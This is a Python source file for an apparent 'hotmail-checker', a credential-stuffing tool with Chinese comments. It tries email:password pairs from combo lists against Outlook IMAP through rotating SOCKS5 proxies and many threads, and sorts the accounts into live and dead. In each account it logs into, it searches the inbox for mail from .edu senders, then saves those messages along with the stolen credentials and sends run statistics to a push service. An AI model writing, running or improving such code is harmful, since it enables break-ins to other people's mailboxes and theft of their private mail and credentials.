import os
import smtplib
import imaplib
import yaml
from hotmail import hotmails
import random
import email
import socket
import sockslib
from datetime import datetime
from zpush import Push
from utils import log_message
import concurrent.futures
from colorama import Fore
from dateutil.relativedelta import relativedelta

with open('config/config.yaml', 'r') as file:
    config = yaml.safe_load(file)

proxies_dir = config['checker']['proxies_dir']
edu_emails_dir = config['checker']['edu_emails_dir']
dead_emails_dir = config['checker']['dead_emails_dir']
live_emails_dir = config['checker']['live_emails_dir']
save_emails_dir = config['checker']['save_emails_dir']
log_level = config['checker']['log_level']
max_workers = config['checker']['max_workers']


class EmailChecker:
    def __init__(self, log_level=1):
        self.mailboxes = []
        self.proxies = []
        self.start_time = None
        self.email_count = 0
        self.live_count = 0
        self.dead_count = 0
        self.edu_count = 0
        self.proxy = False
        self.log_level = log_level
        self.load_proxies()

    @staticmethod
    def load_file(file_path):
        try:
            with open(file_path, 'r') as file:
                return {line.strip() for line in file}
        except FileNotFoundError:
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            with open(file_path, 'w') as file:
                pass  # 创建空文件
            return set()  # 返回空集合

    @staticmethod
    def log_successful_match(email_address, password, from_address):
        with open('out/plus.txt', 'a') as file:
            file.write(f'{email_address} : {password} -> {from_address}\n')

    def load_proxies(self):
        self.proxies = self.load_file(proxies_dir)

        if self.proxies:
            print(self.proxy)
            log_message(f"Loaded {len(self.proxies)} proxies from proxies.txt", color=Fore.LIGHTBLUE_EX)
        else:
            log_message("No proxies found in proxies.txt", color=Fore.RED)
            self.proxy = False

    @staticmethod
    def save_email_content(email_address, from_address, email_message):
        email_filename = f"{save_emails_dir}{email_address.replace('@', '_')}_{from_address.replace('@', '_')}.txt"
        if email_message.is_multipart():
            for part in email_message.walk():
                if part.get_content_type() == 'text/plain':
                    email_body = part.get_payload(decode=True)
        else:
            email_body = email_message.get_payload(decode=True)
        with open(email_filename, 'w') as email_file:
            email_file.write(email_body.decode())

    def get_random_proxy(self):
        proxy_parts = random.choice(self.proxies).split(':')
        address = proxy_parts[0]
        port = int(proxy_parts[1])
        # username = proxy_parts[2]
        # password = proxy_parts[3]
        username = 1
        password = 1
        return address, port, username, password

    def check_login(self, email_address, email_password):
        try:
            # imap_server = "outlook.office365.com"
            # imap_port = 993
            imap_server = "imap-mail.outlook.com"
            socket.setdefaulttimeout(30)
            if self.proxy:
                address, port, username, password = self.get_random_proxy()
                auth_methods = [
                    sockslib.UserPassAuth(username,
                                          password),
                ]
                sockslib.set_default_proxy((address, port), sockslib.Socks.SOCKS5)
                socket.socket = sockslib.SocksSocket
            mail = imaplib.IMAP4_SSL(imap_server)
            mail.login(email_address, email_password)
            return mail, None
        except imaplib.IMAP4.error as e:
            error_message = f" IMAP4.error {str(e)}"
            return None, error_message
        except Exception as e:
            error_message = f"{str(e)}"
            return None, error_message

    def check_edu_mailbox(self, email_address, password, mail, max_check_time):
        start_time = datetime.now()
        mail_count = 0
        try:
            mail.select('INBOX')
            start_date = datetime(2014, 1, 1)
            end_date = datetime(2024, 1, 1)

            while start_date <= end_date:
                if (datetime.now() - start_time).total_seconds() > max_check_time:
                    log_message(f"{email_address} : {password} -> Reached maximum check time.",
                                color=Fore.LIGHTRED_EX)
                    break
                search_criteria = f'(SEEN SENTSINCE "{start_date.strftime("%d-%b-%Y")}" SENTBEFORE "{(start_date + relativedelta(months=1)).strftime("%d-%b-%Y")}")'
                _, message_numbers = mail.search(None, search_criteria)
                mail_count += len(message_numbers[0].split())

                for num in reversed(message_numbers[0].split()):
                    _, msg = mail.fetch(num, '(RFC822)')
                    email_body = msg[0][1]
                    email_message = email.message_from_bytes(email_body)

                    from_address = email_message['From']
                    # 查找@后面是否有.edu
                    if '@' in from_address and '.edu' in from_address.split('@')[1]:
                        self.log_successful_match(email_address, password, from_address)
                        log_message(f"{email_address} : {password} -> EDU Email Found", color=Fore.LIGHTGREEN_EX)
                        self.save_email_content(email_address, from_address, email_message)
                        mail.close()
                        mail.logout()
                        log_message(
                            f"{email_address} : {password} -> Checked {mail_count} emails in {(datetime.now() - start_time).total_seconds()} seconds. ",
                            color=Fore.LIGHTRED_EX)
                        return True

                start_date = start_date + relativedelta(months=1)

            mail.close()
            mail.logout()
            self.email_count += mail_count
            log_message(
                f"{email_address} : {password} -> Checked {mail_count} emails in {(datetime.now() - start_time).total_seconds()} seconds. No EDU email found.",
                color=Fore.LIGHTRED_EX)
            return False
        except imaplib.IMAP4.error as e:
            self.email_count += mail_count
            log_message(f"{email_address} : {password} -> IMAP4.error {str(e)}", color=Fore.WHITE,
                        enable=int(log_level) - 1)
            return False
        except Exception as e:
            self.email_count += mail_count
            log_message(f"{email_address} : {password} -> Error checking EDU emails: {str(e)}", color=Fore.WHITE,
                        enable=int(log_level) - 1)
            return False

    def check_mailbox(self, email_pwd, max_check_time=300):
        e = str(email_pwd).split(':')
        mail, message = self.check_login(e[0], e[1])
        if mail is None:
            with open(dead_emails_dir, 'a') as file:
                file.write(email_pwd + '\n')
            log_message(f"{e[0]} : {e[1]} -> {message}", color=Fore.WHITE, enable=int(log_level) - 2)
            self.dead_count += 1
        else:
            self.live_count += 1
            with open(live_emails_dir, 'a') as file:
                file.write(email_pwd + '\n')
                log_message(f"{e[0]} : {e[1]} -> Login Success", color=Fore.LIGHTBLUE_EX)
            if self.check_edu_mailbox(e[0], e[1], mail, max_check_time):
                with open(edu_emails_dir, 'a') as file:
                    file.write(email_pwd + '\n')
                log_message(f"{e[0]} : {e[1]} -> EDU Email Found", color=Fore.LIGHTGREEN_EX)
                self.edu_count += 1
                return

    def collect_and_send_stats(self):
        # 检查了xx邮箱 有xx个活着的邮箱 有xx个死掉的邮箱 有xx个edu邮箱 检索了xx 封邮件 用时xx分钟
        tips_dict = {
            0.001: "运气太差，邮箱质量太差",
            0.005: "运气不错，邮箱质量一般",
            0.01: "运气太好了吧，邮箱质量很好"
        }
        if len(self.mailboxes) == 0:
            log_message("No mailboxes to check.", color=Fore.LIGHTRED_EX)
            return
        ratio = self.edu_count / len(self.mailboxes)
        tips = next((tips for threshold, tips in tips_dict.items() if ratio < threshold), tips_dict[0.01])
        stats_message = f"检查了{len(self.mailboxes)}邮箱\n" \
                        f"{self.live_count} live {self.dead_count} dead \n" \
                        f"有{self.edu_count} 个edu邮箱 \n" \
                        f"检索了{self.email_count}封邮件 \n" \
                        f"用时{(datetime.now() - self.start_time).total_seconds() / 60} min\n" \
                        f"{tips}"
        log_message(stats_message, color=Fore.LIGHTYELLOW_EX)
        push = Push()
        push.send_message("hotmail-checker ", stats_message)

    def run(self):
        self.mailboxes = hotmails().get_emails()
        self.start_time = datetime.now()
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            list(executor.map(self.check_mailbox, self.mailboxes))

        self.collect_and_send_stats()
